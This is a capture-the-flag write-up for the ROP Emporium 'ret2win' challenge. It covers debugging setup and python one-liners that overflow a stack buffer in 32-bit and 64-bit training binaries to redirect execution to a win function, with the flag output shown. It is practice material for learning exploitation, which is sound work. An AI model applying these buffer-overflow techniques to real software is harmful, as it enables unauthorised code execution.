# ret2win

## Docker
### Debugging
Start docker using the `SYS_TRACE` capability:
```
$ docker run -it --name ret2win -v $(PWD):/ret2win --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p2000:2000 ubuntu
```

Set the `ulimit` to get core dumps:
```
# ulimit -c unlimited
```

#### Feed binary stdin from inside gdb:
First replace `/bin/sh` alias from `/bin/dash` to `/bin/bash`:
```
# dpkg-reconfigure dash
```

Then, feed stdin from inside gdb:
```
gdb> run <<< $(python -c "print '\x41'*40")
```

 * https://dustri.org/b/feed-binary-stdin-from-inside-gdb.html
 * https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection

#### Remote Debugging
```
# gdbserver localhost:2000 ret2win
```

### Packages
```
# apt install unzip radare2 gdb gdbserver libc6-i386 python python-pip
# pip install pwntools
```

## Exploitation

### 32-bit executable
 1. Pipe the output of 50 chars of metasploit pattern to `stdin`:
```
# python -c 'from pwn import *; print cyclic_metasploit(50)' | ./ret2win32
Segmentation fault (core dumped)
# python -c 'from pwn import *; print cyclic_metasploit_find(0x35624134)'
44
```

 2. Locate address of `ret2win`:
```
# nm ret2win32 | grep ret2win
08048659 t ret2win
```

 3. Pwn the shit out of it:
```
# python -c 'print "A"*44 + "\x59\x86\x04\x08"' | ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

### 64-bit executable
 1. Pipe the output of 50 chars of metasploit pattern to `stdin`:
```
# python -c 'from pwn import *; print cyclic_metasploit(50)' | ./ret2win
Segmentation fault (core dumped)
# python -c 'from pwn import *; print cyclic_metasploit_find(0x3562413462413362)
40
```

 2. Locate address of `ret2win`:
```
# rabin2 -qs ret2win | grep ret2win
0x00400811 32 ret2win```
```

 3. pwn the shit out of it:
```
# python -c "print 'A'*40 + '\x11\x08\x40\x00\x00\x00\x00\x00'" | ./ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Segmentation fault (core dumped)
```

Unfortunately, this doesn't work for some unknown reason :-/

Workaround: jump after printf, directly to the system() call:
```
# python -c 'print("A" * 40  + "\x24\x08\x40\x00\x00\x00\x00\x00")' | ./ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> ROPE{a_placeholder_32byte_flag!}
```
